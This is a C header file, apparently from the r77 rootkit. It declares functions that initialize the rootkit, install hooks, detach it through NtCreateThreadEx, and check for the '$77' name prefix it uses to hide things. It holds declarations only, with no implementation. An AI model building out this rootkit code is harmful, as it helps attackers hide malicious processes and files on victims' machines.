#include "r77mindef.h"
#ifndef _ROOTKIT_H
#define _ROOTKIT_H

/// <summary>
/// Initializes r77, writes the r77 header and installs hooks.
/// <para>This function returns FALSE, if r77 is already injected, or if this process is either the r77 service or a helper process, or the process starts with $77.</para>
/// </summary>
/// <returns>
/// TRUE, if r77 was successfully loaded;
/// otherwise, FALSE.
/// </returns>
BOOL InitializeRootkit();
/// <summary>
/// Detaches r77 from this process.
/// </summary>
VOID UninitializeRootkit();
/// <summary>
/// A function that can be invoked using NtCreateThreadEx to detach r77 from this process.
/// <para>The address of this function is written to the r77 header.</para>
/// </summary>
static VOID DetachRootkit();

/// <summary>
/// Determines whether a string is hidden by prefix.
/// </summary>
/// <param name="str">The unicode string to be checked.</param>
/// <returns>
/// TRUE, if this string is hidden by prefix;
/// otherwise, FALSE.
/// </returns>
BOOL HasPrefix(LPCWSTR str);
/// <summary>
/// Determines whether a string is hidden by prefix.
/// </summary>
/// <param name="str">The unicode string to be checked.</param>
/// <returns>
/// TRUE, if this string is hidden by prefix;
/// otherwise, FALSE.
/// </returns>
BOOL HasPrefixU(UNICODE_STRING str);

#endif